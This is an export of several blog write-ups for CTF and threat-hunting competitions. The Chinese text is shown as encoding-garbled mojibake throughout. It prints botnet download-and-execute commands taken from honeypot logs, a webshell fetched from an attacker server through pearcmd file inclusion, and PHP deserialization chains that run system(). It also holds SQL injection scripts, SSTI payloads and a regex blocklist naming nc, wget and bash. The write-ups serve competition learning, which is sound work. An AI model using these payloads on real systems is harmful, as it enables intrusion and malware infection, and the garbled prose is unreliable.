æ’­æºIPå’Œä¸‹è½½ç«™IPï¼ˆä½œç­”æ—¶åªéœ€ç»™å‡ºIPå³å¯ï¼Œæ— éœ€å…·ä½“æŒ‡å®šæ¯ä¸ªIPæ˜¯ä¼ æ’­æºè¿˜æ˜¯ä¸‹è½½ç«™ï¼‰ã€‚ ä¸‹è½½æä¾›çš„honeylog.jsonï¼Œè§‚å¯Ÿå‘ç°ï¼Œå¤§éƒ¨åˆ†ä¼ è¾“æ¶æ„æ ·æœ¬æ–‡ä»¶çš„æµé‡å‡ä½¿ç”¨äº†wgetåè®®æ¥ä¸‹è½½æ¶æ„æ ·æœ¬ï¼Œå› æ­¤å¯ä»¥å°†å¸¦æœ‰wgetçš„å­—ç¬¦ä¸²è¿‡æ»¤å‡ºæ¥ã€‚ æ ¹æ®é¢˜ç›®æè¿°çš„CVE-2019-7238ï¼Œå…¶æ¼æ´åˆ©ç”¨è·¯å¾„ä¸º/service/extdirectï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªè·¯å¾„æ‰¾åˆ°ä¸€ä¸ªæ¶æ„æ ·æœ¬ã€‚ è§£ç­”ç¼–å†™æå–wgetå­—ç¬¦ä¸²çš„è„šæœ¬ï¼Œè„šæœ¬æå–æ–¹å¼ä¸ºè¯†åˆ«wget ã€wget+æˆ–wget%ä¸ºå‰ç¼€ï¼Œ;æˆ–)ä¸ºåç¼€çš„å­—ç¬¦ä¸²ã€‚ 1234567891011121314151617wget_lines = set()with open(&#x27;honeylog.json&#x27;, &#x27;r&#x27;) as file: for line in file: line = line.strip() if &#x27;wget &#x27; in line or &#x27;wget%&#x27; in line or &#x27;wget+&#x27; in line: begin_index=line.find(&#x27;wget&#x27;) ll=[len(line)] if line.find(&#x27;;&#x27;)!=-1: ll.append(line.find(&#x27;;&#x27;)) if line.find(&#x27;)&#x27;)!=-1: ll.append(line.find(&#x27;)&#x27;)) end_index = min(ll) wget_lines.add(line[begin_index:end_index])# å°†æ»¡è¶³æ¡ä»¶çš„è¡Œå†™å…¥2.txtwith open(&#x27;2.txt&#x27;, &#x27;w&#x27;) as file: file.write(&#x27;\\n&#x27;.join(wget_lines)) è¿è¡Œè„šæœ¬åï¼Œå¾—åˆ°ï¼š 1234567891011121314wget http://miori.lol/miori.arm7 &amp;&amp; chmod 777 miori.arm7 &amp;&amp; ./miori.arm7 selfrep.vigor &amp;&amp; rm -rf miori.arm7wget -g 103.178.232.12 -l /tmp/.oxy -r /mipswget -g 107.173.231.76 -l /tmp/.oxy -r /mipswget http://112.192.5.28:8888/koba -O /tmp/koba &amp;&amp; cd /tmp &amp;&amp; chmod +x koba &amp;&amp; ./koba &amp;&quot;&#125;&#125;wget -g 143.198.91.91 -l /tmp/.oxy -r /mipswget -g 193.233.193.12 -l /tmp/.oxy -r /yeye/yeye.mipswget -g 103.183.118.160 -l /tmp/.oxy -r /mipswget http://download.asyncfox.xyz/download/dupa2.sh -O- | bashwget -g 109.98.208.52 -l /tmp/.oxy -r /mipswget http://46.29.166.61/arm7 &amp;&amp; chmod 777 arm7 &amp;&amp; ./arm7 selfrep.vigor &amp;&amp; rm -rf arm7wget http://74.209.210.114:8888/caesar -O /tmp/caesar &amp;&amp; cd /tmp &amp;&amp; chmod +x caesar &amp;&amp; ./caesar &amp;wget http://149.129.92.9:8888/caesar -O /tmp/caesar &amp;&amp; cd /tmp &amp;&amp; chmod +x caesar &amp;&amp; ./caesar &amp;wget -g 64.227.121.58 -l /tmp/.oxy -r /mipswget http://45.95.146.26/miori.arm7 &amp;&amp; chmod 777 miori.arm7 &amp;&amp; ./miori.arm7 selfrep.vigor &amp;&amp; rm -rf miori.arm7 å…¶ä¸­caesarï¼Œkobaåœ¨å¤§ç½‘ç¯å¢ƒä¸­å¯ä»¥æˆåŠŸä¸‹è½½ï¼Œä½¿ç”¨md5sumè®¡ç®—æ ·æœ¬md5å€¼ï¼Œç¼–å†™è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435import jsoncaesar_set = set()caesar_set.add(&#x27;74.209.210.114&#x27;)caesar_set.add(&#x27;149.129.92.9&#x27;)koba_set=set()koba_set.add(&#x27;112.192.5.28&#x27;)# è¯»å–æ–‡ä»¶with open(&#x27;honeylog.json&#x27;, &#x27;r&#x27;) as file: # é€è¡Œè¯»å– for line in file: if &#x27;caesar&#x27; in line: try: data = json.loads(line) src_ip = data.get(&#x27;src_ip&#x27;) if src_ip: caesar_set.add(src_ip) except: pass if &#x27;koba&#x27; in line: try: data = json.loads(line) src_ip = data.get(&#x27;src_ip&#x27;) if src_ip: koba_set.add(src_ip) except: pass with open(&#x27;md5_file.txt&#x27;,&#x27;w&#x27;) as f: f.write(&#x27;82f485f6d3dbad747ef307158fc7ea48:&#x27;) f.write(&#x27;,&#x27;.join(caesar_set)) f.write(&#x27;\\n&#x27;) f.write(&#x27;e4d87fc7fd025213a86b0db38b147375:&#x27;) f.write(&#x27;,&#x27;.join(koba_set)) å¾—åˆ°ç­”æ¡ˆï¼š 1282f485f6d3dbad747ef307158fc7ea48:149.129.92.9,74.209.210.114,194.216.26.179e4d87fc7fd025213a86b0db38b147375:112.192.5.28,195.220.160.50 é¢˜ç›®å››ï¼šæ¶ˆå¤±çš„çªƒå¯†æµé‡åˆ†æé¢˜ç›®æè¿°ï¼šæ‰¾åˆ°çªƒå¯†æµé‡æœ€ç»ˆæµå‘çš„æœåŠ¡å™¨IPï¼Œå¹¶æ ¹æ®ç›®å‰æŒæ¡çš„çº¿ç´¢ç»™å‡º**æ­¤æ¬¡æ”»å‡»äº‹ä»¶ä¸­(DDoS+çªƒå¯†)**æ˜ç¡®è¢«æ§çš„ä¸»æœºIPï¼›è¯·ç»™å‡ºåŸå§‹è¢«çªƒå–æ–‡ä»¶çš„MD5ã€‚ æˆ‘ä»¬é˜Ÿä¼åªæ‰¾åˆ°äº†éƒ¨åˆ†DDoSçš„è¢«æ§ipã€‚ è§£ç­”ä½¿ç”¨idaåç¼–è¯‘caesaræ–‡ä»¶ï¼Œè¿›å…¥mainå‡½æ•° è¿›å…¥å‡½æ•°sub_33F9ä¸­ï¼Œå‘ç°å…¶è°ƒç”¨äº†å¤šæ¬¡sub_3A91å‡½æ•° è¿›å…¥sub_3A91å‡½æ•°å‘ç°æ˜¯å°†å‡½æ•°åœ°å€å†™å…¥ä¸€ä¸ªptrå˜é‡ã€‚ æŸ¥æ‰¾ptrçš„è°ƒç”¨è€…ï¼Œè§‚å¯Ÿåˆ°sub_387Aå‡½æ•° ç»è¿‡åˆ†æï¼Œè¯¥å‡½æ•°æ˜¯å°†æ¯ä¸ªå­˜å…¥çš„å‡½æ•°åœ°å€éƒ½è¿›è¡Œè°ƒç”¨ å›åˆ°sub_33F9å‡½æ•°ä¸­ï¼Œå‘ç°å¯ç–‘å‡½æ•°sub_5841å’Œsub_6249ï¼Œè¿›å…¥åå‘ç°å…¶å‡ä¸ºddosä¸­å‘èµ·ccæ”»å‡»çš„å‡½æ•° sub_5841ï¼š sub_6249ï¼š å› æ­¤ï¼Œå°†ç¬¬ä¸€é¢˜ä¸­çš„ccæ”»å‡»ipå¯¼å…¥è¿›æ¥å³å¯ï¼Œç¼–å†™è„šæœ¬ï¼š 123456789101112131415161718url_set=set()q1=open(&#x27;q1_answer.txt&#x27;,&#x27;r&#x27;)q1.readline()q1.readline()for i in q1.readline().strip().split(&#x27;,&#x27;): url_set.add(i)q1.readline()for i in q1.readline().strip().split(&#x27;,&#x27;): url_set.add(i) q1.close()q3=&#x27;153.97.92.169&#x27;with open(&#x27;q4_answer.txt&#x27;,&#x27;w&#x27;) as f: f.write(q3) f.write(&#x27;\\n&#x27;) f.write(&#x27;,&#x27;.join(url_set)) f.write(&#x27;\\n&#x27;) å¾—åˆ°25%çš„åˆ†æ•°ã€‚ é‚®ä»¶å®‰å…¨é¢˜ç›®äºŒï¼šæ–°å‹é‚®ä»¶ç‚¸å¼¹æ”»å‡»ç¼–å†™è„šæœ¬ï¼Œæå–å‰10000æƒé‡çš„ç½‘å€ã€‚ 12345678910mails=[]with open(&#x27;top_mail.csv&#x27;,&#x27;r&#x27;) as file: for i in file: a=i.split(&#x27;,&#x27;) if int(a[0])&gt;10000: break else: mails.append(a[1])with open(&#x27;top_10000_mails.txt&#x27;,&#x27;w&#x27;) as f: f.write(&#x27;&#x27;.join(mails)) ä»ä¸Šåˆ°ä¸‹ï¼Œä¾æ¬¡æµ‹è¯•å‘é€é‚®ä»¶ã€‚ ä½¿ç”¨å·²æ³¨å†Œé‚®ç®±ï¼Œå¦‚qq.comã€gmail.comç­‰å‘é€é‚®ä»¶ã€‚ æ€»ç»“æœ€å¼€å§‹ä»¥ä¸ºæ¯”èµ›ä¼šå¾ˆéš¾ï¼Œä½†æ˜¯æ„Ÿè§‰éš¾åº¦è¿˜å¯ä»¥ï¼Ÿ å¯æƒœçš„æ˜¯äº’è”ç½‘å¨èƒæº¯æºåˆ°åé¢é€†å‘çš„æ—¶å€™å°±å¼€å§‹ä¹åŠ›äº†ï¼Œåšä¸å‡ºæ¥é¢˜ï¼Œæ„Ÿè§‰è¯¥é€†çš„éƒ½é€†äº†ï¼Œè¯¥è„±å£³ä¹Ÿæ‰‹è„±äº†ï¼Œæ£€æŸ¥ç‚¹ä¹Ÿä¸€æ¬¡æ²¡å°‘ï¼Œä½†å°±æ˜¯æ‰¾ä¸åˆ°ç­”æ¡ˆçš„IPåœ°å€ï¼Œç­‰èµ›åçœ‹çœ‹åˆ«äººçš„wpå§ã€‚ é‚®ä»¶å®‰å…¨é‚£é“é¢˜å•çº¯çš„æ‰“ç€ç©ï¼Œå‘äº†ä¸¤ä¸ªå°æ—¶çš„é‚®ä»¶ã€‚ è´´ä¸€éƒ¨åˆ†çš„æ¯”èµ›é¢˜ç›®ï¼š äº’è”ç½‘å¨èƒæº¯æº.zip top_mail.csv æ›´æ–°äº2023&#x2F;12&#x2F;10 å®˜æ–¹wpå·²å‡ºï¼Œä»”ç»†çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°å…¶å®è‡ªå·±æ²¡åˆ†æå‡ºæ¥çš„ä¸œè¥¿è¿˜æœ‰å¾ˆå¤šï¼Œå…¶ä¸­æ‰¾ipåœ°å€çš„æ—¶å€™æˆ‘ä¹Ÿå°è¯•è¿‡å‘169.196.166.199: 16996å‘åŒ…ï¼Œå®˜æ–¹wpæ˜¯ç”¨pythonå‘é€çš„ï¼Œæˆ‘æ˜¯ç›´æ¥ç”¨nc -uå‘çš„åŒ…ï¼Œä½†æ˜¯æ²¡æ”¶åˆ°è¿”å›çš„ä¿¡æ¯ï¼Œå¯¼è‡´æˆ‘ä»¥ä¸ºå®ƒçš„ç¯å¢ƒå·²ç»å…³äº†ï¼Œäºæ˜¯æ²¡äº†å¤´ç»ªã€‚ å½“æ—¶ä»¥ä¸ºè‡ªå·±éƒ½çœ‹çš„å·®ä¸å¤šï¼Œä½†ç°åœ¨æƒ³äº†ä¸€ä¸‹ï¼Œå…¶å®æˆ‘åšå‡ºæ¥çš„å¯èƒ½ä¹Ÿå°±ä¸€åŠå·¦å³ï¼ŒåŸå› å¤§ä½“ä¸Šå¯èƒ½æ˜¯å¯¹C2åƒµå°¸ç½‘ç»œçš„åŸç†å¤„äºä¸äº†è§£çš„çŠ¶æ€ï¼Œç”šè‡³æˆ‘è§‰å¾—æ˜¯å¯¹ä¸€ä¸ªé¢†åŸŸçš„æ•´ä½“æ¶æ„æ²¡æœ‰æ„å»ºèµ·æ¥ã€‚ æœ€åæŠŠå®˜æ–¹wpè´´ä¸Šå§ï¼šDataCon2023äº’è”ç½‘å¨èƒæº¯æºèµ›é“ï¼Œå† å†›æˆ˜é˜ŸWPåˆ†äº« (qq.com)","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://blog.lazyforever.top/categories/WriteUp/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://blog.lazyforever.top/tags/reverse/"},{"name":"wireshark","slug":"wireshark","permalink":"https://blog.lazyforever.top/tags/wireshark/"}]},{"title":"NewStarCTF 2023-WEEK4 Web WriteUp","slug":"2023newstarctfWeek4","date":"2023-11-05T13:02:41.000Z","updated":"2023-11-16T13:03:56.610Z","comments":true,"path":"2023/11/05/2023newstarctfWeek4/","link":"","permalink":"https://blog.lazyforever.top/2023/11/05/2023newstarctfWeek4/","excerpt":"","text":"è§£é¢˜ 4&#x2F;7 é€ƒæ‰“å¼€å®¹å™¨ï¼Œçœ‹åˆ°æºç  1234567891011121314151617181920&lt;?phphighlight_file(__FILE__);function waf($str)&#123; return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123; public $key; public $cmd = &quot;whoami&quot;; public function __construct($key) &#123; $this-&gt;key = $key; &#125; public function __destruct() &#123; system($this-&gt;cmd); &#125;&#125;unserialize(waf(serialize(new GetFlag($_GET[&#x27;key&#x27;])))); æ˜æ˜¾çš„phpååºåˆ—åŒ–é€ƒé€¸ï¼Œåˆ©ç”¨åŸç†å³ä½¿ç”¨å¤§é‡çš„badæ›¿æ¢ä¸ºgoodæ¥é€ƒé€¸phpååºåˆ—åŒ–çš„å­—ç¬¦æ•°é‡æ ‡è®° ç»™å‡ºpayloadï¼š 123456789101112131415161718192021222324&lt;?phphighlight_file(__FILE__);function waf($str)&#123; return str_replace(&quot;bad&quot;, &quot;good&quot;, $str);&#125;class GetFlag&#123; public $key; public $cmd = &quot;whoami&quot;; public function __construct($key) &#123; $this-&gt;key = $key; &#125; public function __destruct() &#123; system($this-&gt;cmd); &#125;&#125;$a = new GetFlag(&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\\&quot;;s:3:\\&quot;cmd\\&quot;;s:4:\\&quot;cat /flag\\&quot;;&#125;&quot;);echo waf(serialize($a));//O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:88:&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125; More Fastå¼€å®¹å™¨çœ‹æºç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phphighlight_file(__FILE__);class Start&#123; public $errMsg; public function __destruct() &#123; die($this-&gt;errMsg); &#125;&#125;class Pwn&#123; public $obj; public function __invoke()&#123; $this-&gt;obj-&gt;evil(); &#125; public function evil() &#123; phpinfo(); &#125;&#125;class Reverse&#123; public $func; public function __get($var) &#123; ($this-&gt;func)(); &#125;&#125;class Web&#123; public $func; public $var; public function evil() &#123; if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var))&#123; ($this-&gt;func)($this-&gt;var); &#125;else&#123; echo &quot;Not Flag&quot;; &#125; &#125;&#125;class Crypto&#123; public $obj; public function __toString() &#123; $wel = $this-&gt;obj-&gt;good; return &quot;NewStar&quot;; &#125;&#125;class Misc&#123; public function evil() &#123; echo &quot;good job but nothing&quot;; &#125;&#125;$a = @unserialize($_POST[&#x27;fast&#x27;]);throw new Exception(&quot;Nope&quot;); çœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªphpçš„__destructååºåˆ—åŒ–åˆ©ç”¨ï¼Œä½†æ˜¯æ³¨æ„åˆ°ç»“å°¾å¤„å‡ºç°throw new Exception(&quot;Nope&quot;);å¼ºåˆ¶è·‘å‡ºå¼‚å¸¸è¿›å…¥åˆ°gcåƒåœ¾å›æ”¶æ¨¡å¼ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ååºåˆ—åŒ–å¤„è§¦å‘å¼‚å¸¸æå‰è¿›å…¥åƒåœ¾å›æ”¶æ¨¡å¼ï¼Œå…¶ä¸­ï¼Œè§¦å‘å¼‚å¸¸çš„æƒ…å†µå¸¸è§æœ‰å‡ ç§ï¼š å¯¹è±¡è¢«unset()å¤„ç†æ—¶ï¼Œå¯ä»¥è§¦å‘ã€‚ æ•°ç»„å¯¹è±¡ä¸ºNULLæ—¶ï¼Œå¯ä»¥è§¦å‘ã€‚ å½“è¾“å…¥çš„åºåˆ—åŒ–å¯¹è±¡æ ¼å¼ä¸å®Œæ•´æˆ–ä¸æ­£ç¡®æ—¶ï¼Œå¯ä»¥è§¦å‘ã€‚ è¿™é‡Œé‡‡ç”¨ç¬¬ä¸‰ç§æ–¹å¼ç»•è¿‡ï¼ˆå½“ç„¶ï¼Œåˆ«çš„æ–¹å¼ä¹Ÿå¯ä»¥æ­£å¸¸ç»•è¿‡ï¼‰ ç»™å‡ºpayload 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?phphighlight_file(__FILE__);class Start&#123; public $errMsg; public function __destruct() &#123; die($this-&gt;errMsg); &#125;&#125;class Pwn&#123; public $obj; public function __invoke() &#123; $this-&gt;obj-&gt;evil(); &#125; public function evil() &#123; phpinfo(); &#125;&#125;class Reverse&#123; public $func; public function __get($var) &#123; ($this-&gt;func)(); &#125;&#125;class Web&#123; public $func = &quot;system&quot;; public $var = &quot;ls&quot;; public function evil() &#123; if (!preg_match(&quot;/flag/i&quot;, $this-&gt;var)) &#123; ($this-&gt;func)($this-&gt;var); &#125; else &#123; echo &quot;Not Flag&quot;; &#125; &#125;&#125;class Crypto&#123; public $obj; public function __toString() &#123; $wel = $this-&gt;obj-&gt;good; return &quot;NewStar&quot;; &#125;&#125;$a = new Start();$a-&gt;errMsg = new Crypto();$a-&gt;errMsg-&gt;obj = new Reverse();$a-&gt;errMsg-&gt;obj-&gt;func = new Pwn();$a-&gt;errMsg-&gt;obj-&gt;func-&gt;obj = new Web();echo serialize($a); å¾—åˆ°çš„payloadç»“å°¾åˆ å»ä¸€ä¸ªåå¤§æ‹¬å·å³å¯ã€‚ midsqlæ‰“å¼€å®¹å™¨çœ‹åˆ°sqlæºç  123$cmd = &quot;select name, price from items where id = &quot;.$_REQUEST[&quot;id&quot;];$result = mysqli_fetch_all($result);$result = $result[0]; æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°æ˜¯æ•°å­—æ³¨å…¥ä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œè¿˜ç¦ç”¨äº†å‡ ä¸ªå­—ç¬¦ã€‚ ä½¿ç”¨å»¶æ—¶æ³¨å…¥æ–¹æ³•ï¼Œå†™ä¸ªpythonè„šæœ¬ 123456789101112131415161718192021222324import requestsurl=&#x27;http://f510f1ff-a866-49a0-81ac-821cf0393322.node4.buuoj.cn:81/?id=1%2f**%2fand%2f**%2fif%28ascii%28substr%28database%28%29%2C&#123;&#125;%2C1%29%29&lt;&gt;&#123;&#125;%2C0%2Csleep%285%29%29&#x27;url1=&#x27;http://f510f1ff-a866-49a0-81ac-821cf0393322.node4.buuoj.cn:81/?id=1%2f**%2fand%2f**%2fif%28ascii%28substr%28%28select%2f**%2fgroup_concat%28table_schema%29%2F**%2Ffrom%2F**%2Finformation_schema.tables%2F**%2Fwhere%2F**%2Ftable_name%2F**%2Flike%2F**%2F%27items%27%29%2C&#123;&#125;%2C1%29%29&lt;&gt;&#123;&#125;%2C0%2Csleep%285%29%29&#x27;url1=&#x27;http://f510f1ff-a866-49a0-81ac-821cf0393322.node4.buuoj.cn:81/?id=1%2f**%2fand%2f**%2fif%28ascii%28substr%28%28select%2f**%2fgroup_concat%28schema_name%29%2F**%2Ffrom%2F**%2Finformation_schema.schemata%2F**%2F%29%2C&#123;&#125;%2C1%29%29&lt;&gt;&#123;&#125;%2C0%2Csleep%285%29%29&#x27;flag=&#x27;&#x27;url1=&#x27;http://f510f1ff-a866-49a0-81ac-821cf0393322.node4.buuoj.cn:81/?id=1%2f**%2fand%2f**%2fif%28ascii%28substr%28%28select%2f**%2fgroup_concat%28name%29%2F**%2Ffrom%2F**%2Fctf.items%29%2C&#123;&#125;%2C1%29%29&lt;&gt;&#123;&#125;%2C0%2Csleep%285%29%29&#x27;temp_url=url1.format(1,0)re=requests.get(temp_url)print(re.text)for i in range(1,100): # print(i) for j in range(32,126): temp_url=url1.format(i,j) try: re=requests.get(temp_url,timeout=3) #print(j) except Exception: flag+=chr(j) print(chr(j),end=&#x27;&#x27;) breakprint(&#x27;\\n&#x27;,flag) å¾—åˆ°flag flask diskæ‰“å¼€å®¹å™¨ï¼Œçœ‹åˆ°ä¸Šä¼ ç•Œé¢ï¼Œä¸Šä¼ ä¸€ä¸ªç©ºå†…å®¹ï¼Œå‘ç°python flaskæ¡†æ¶çš„debugæ¨¡å¼æ²¡å…³ï¼Œæƒ³åˆ°debugæ¨¡å¼çš„çƒ­åŠ è½½ç‰¹æ€§ï¼Œç›´æ¥ä¸Šä¼ ä¸€ä¸ªapp.pyï¼ŒåŠ ä¸€ä¸ªè¯»flagçš„è·¯ç”±å³å¯ã€‚ app.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from crypt import methodsfrom flask import Flask,request,send_fileimport os,datetimeapp = Flask(__name__)@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;])def index(): return &#x27;&lt;h1&gt;Welcome to my flask disk&lt;/h1&gt;&lt;a href=&quot;/list&quot;&gt;list files&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;/upload&quot;&gt;upload files&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;/console&quot;&gt;admin manage&lt;/a&gt;&#x27;@app.route(&#x27;/list&#x27;,methods=[&#x27;GET&#x27;])def list(): dirs = os.listdir(&#x27;.&#x27;) items = &#x27;&#x27; for dir in dirs: if os.path.isfile(dir): create_time = int(os.path.getctime(dir)) create_time = datetime.datetime.fromtimestamp(create_time) item =f&#x27;&lt;/pre&gt;&#123;dir&#125; &#123;str(os.path.getsize(dir))&#125;b &#123;create_time&#125;&lt;/pre&gt;&lt;br&gt;&lt;br&gt;&#x27; items += item items += &#x27;\\n&#x27; return items@app.route(&#x27;/aa&#x27;,methods=[&#x27;GET&#x27;])def aa(): os.system(&#x27;cat /flag &gt; /app/1.txt&#x27;) return &#x27;os.system(a)&#x27;@app.route(&#x27;/upload&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def upload(): if request.method == &#x27;GET&#x27;: s=&#x27;&lt;form action=&quot;/upload&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;&lt;/form&gt;&#x27; return s elif request.method == &#x27;POST&#x27;: file = request.files[&#x27;file&#x27;] if &#x27;..&#x27; in file.filename or &#x27;/&#x27; in file.filename: return &#x27;.. and / are not allowed!&#x27; file.save(file.filename) return &#x27;upload success. &lt;a href=&quot;/list&quot;&gt;check&lt;/a&gt;&#x27; @app.route(&#x27;/download&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def download(): filename = request.args.get(&#x27;filename&#x27;) if filename and os.path.exists(filename): if &#x27;..&#x27; in filename or &#x27;/&#x27; in filename: return &#x27;.. and / are not allowed!&#x27; return send_file(filename,as_attachment=True) else: return &#x27;no file to download or file not exist&#x27;if __name__==&#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;,debug=True,port=5000) æ€»ç»“éš¾èµ·æ¥äº†ï¼Œå¼€å§‹åç‰¢äº†ã€‚ã€‚ã€‚ è´´ä¸ªwpï¼šhttps://shimo.im/docs/gXqmdVvbOEsXpo3o/read é¡ºä¾¿æŠŠç¬¬äº”å‘¨çš„ä¹Ÿè´´ä¸Šäº†ï¼šhttps://shimo.im/docs/R3sGgZdrlyE6nL8T/read","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://blog.lazyforever.top/categories/WriteUp/"}],"tags":[{"name":"web","slug":"web","permalink":"https://blog.lazyforever.top/tags/web/"}]},{"title":"NewStarCTF 2023-WEEK3 Web WriteUp","slug":"2023newstarctfWeek3","date":"2023-10-17T04:55:06.000Z","updated":"2023-10-22T13:57:05.312Z","comments":true,"path":"2023/10/17/2023newstarctfWeek3/","link":"","permalink":"https://blog.lazyforever.top/2023/10/17/2023newstarctfWeek3/","excerpt":"","text":"è§£é¢˜ 5&#x2F;6 Include ğŸæ‰“å¼€å®¹å™¨ï¼Œæç¤ºphpinfo è¿›å…¥phpinfo.phpæŸ¥çœ‹phpé…ç½®ï¼Œå‘ç°register_argc_argvé…ç½®è¢«æ‰“å¼€ï¼Œindex.phpå†…éƒ¨æœ‰ä¸€ä¸ªåç¼€åä¸º.phpçš„æ–‡ä»¶åŒ…å«ï¼Œé€šè¿‡pearcmdæ¥åŒ…å«è¿›è¡Œæ¶æ„æ–‡ä»¶çš„ä¸‹è½½ï¼Œåœ¨vpsä¸Šæ„é€ æ¶æ„æ–‡ä»¶ 12&lt;?php echo &#x27;&lt;?php system($_GET[0]);&#x27;; ä½¿ç”¨pearcmdåŒ…å«ï¼š?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php è¿›å…¥tmp&#x2F;pear&#x2F;download&#x2F;evil.phpç›´æ¥å‘½ä»¤æ‰§è¡Œå³å¯ã€‚ medium_sqlè·ŸWeek2å·®ä¸å¤šï¼Œä½†æ˜¯æŠŠunionçš„å¤§å°å†™ç¦ç”¨äº†ï¼Œç”¨ä¸äº†è”åˆæ³¨å…¥ï¼Œä½¿ç”¨å¸ƒå°”æ³¨å…¥ è´´ä¸ªå¸ƒå°”æ³¨å…¥è„šæœ¬ 123456789101112131415161718import requestsimport stringurl=&#x27;http://4bbc4bf0-4b86-4dc7-90db-8609acab2c76.node4.buuoj.cn:81/?id=TMP0919\\&#x27;And if(suBstring((seLect flag from ctf.here_is_flag liMit%201),&#123;&#125;,1)=\\&#x27;&#123;&#125;\\&#x27;,1,0)--+&#x27;all_chars = string.ascii_lowercase + string.digits + &quot;_&quot;+&quot;&#123;&quot;+&quot;&#125;&quot;+&quot;-&quot;flag=&#x27;&#x27;for i in range(1,50): for j in all_chars: ppp=url.format(i, j) re=requests.get(ppp) if len(re.text)&gt;450: print(j,end=&#x27;&#x27;) breakprint(&quot;Flag: &quot;, flag) POP Gadgetæ‰“å¼€å®¹å™¨ï¼Œæ˜¯phpååºåˆ—åŒ– POPé“¾ï¼šBegin-&gt;name-&gt;__destruct()-&gt;Then-&gt;func-&gt;__toString()-&gt;Super-&gt;obj-&gt;invoke()-&gt;Handle-&gt;obj-&gt;__call-&gt;CTF-&gt;handle-&gt;end()-&gt;WhiteGod-&gt;__unset() payloadï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798&lt;?phphighlight_file(__FILE__);class Begin&#123; public $name; public function __destruct() &#123; if (preg_match(&quot;/[a-zA-Z0-9]/&quot;, $this-&gt;name)) &#123; echo &quot;Hello&quot;; &#125; else &#123; echo &quot;Welcome to NewStarCTF 2023!&quot;; &#125; &#125;&#125;class Then&#123; private $func; public function __construct() &#123; $this-&gt;func = new Super; &#125; public function __toString() &#123; ($this-&gt;func)(); return &quot;Good Job!&quot;; &#125;&#125;class Handle&#123; protected $obj; public function __construct() &#123; $this-&gt;obj = new CTF; &#125; public function __call($func, $vars) &#123; $this-&gt;obj-&gt;end(); &#125;&#125;class Super&#123; protected $obj; public function __construct() &#123; $this-&gt;obj = new Handle; &#125; public function __invoke() &#123; $this-&gt;obj-&gt;getStr(); &#125; public function end() &#123; die(&quot;==GAME OVER==&quot;); &#125;&#125;class CTF&#123; public $handle; public function __construct() &#123; $this-&gt;handle = new WhiteGod; &#125; public function end() &#123; unset($this-&gt;handle-&gt;log); &#125;&#125;class WhiteGod&#123; public $func = &#x27;system&#x27;; public $var = &#x27;cat /flag&#x27;; public function __unset($var) &#123; ($this-&gt;func)($this-&gt;var); &#125;&#125;$a = new Begin;$a-&gt;name = new Then;echo urlencode(serialize($a)); GenShinæ‰“å¼€å®¹å™¨åå‘ç°è¿”å›è¡¨å¤´popå€¼ä¸º&#x2F;secr3tofpop è¿›å…¥åå‘ç°æ˜¯python flaskçš„ssti é»‘åå•æœ‰&#123;&#123;&#125;&#125;ï¼Œosï¼Œ=ç­‰ name=&#123;%print(&#123;&#125;.__class__.__bases__[0].__subclasses__())%&#125;æŸ¥çœ‹æ‰€æœ‰æ–¹æ³• ä½¿ç”¨FileLoader ?name=&#123;%print(&#123;&#125;.__class__.__bases__[0].__subclasses__()[99][%22get_data%22](0,%22flag%22))%&#125; å¾—åˆ°flag R!!!C!!!E!!!æ‰“å¼€å®¹å™¨ï¼Œå‘ç°ä»£ç ï¼š 123456789101112131415161718192021&lt;?phphighlight_file(__FILE__);class minipop&#123; public $code; public $qwejaskdjnlka; public function __toString() &#123; if(!preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $this-&gt;code))&#123; exec($this-&gt;code); &#125; return &quot;alright&quot;; &#125; public function __destruct() &#123; echo $this-&gt;qwejaskdjnlka; &#125;&#125;if(isset($_POST[&#x27;payload&#x27;]))&#123; //wanna try? unserialize($_POST[&#x27;payload&#x27;]);&#125; è¿‡æ»¤çš„å­—ç¬¦æœ‰ç‚¹å¤šï¼Œä¸å¤ªå®¹æ˜“RCEï¼Œæœ€åç”¨äº†ä¸ªå°æŠ€å·§ï¼ŒæŠŠindex.phpä¸­çš„|åˆ å»ï¼Œç„¶åå†å‘½ä»¤æ‰§è¡Œã€‚ 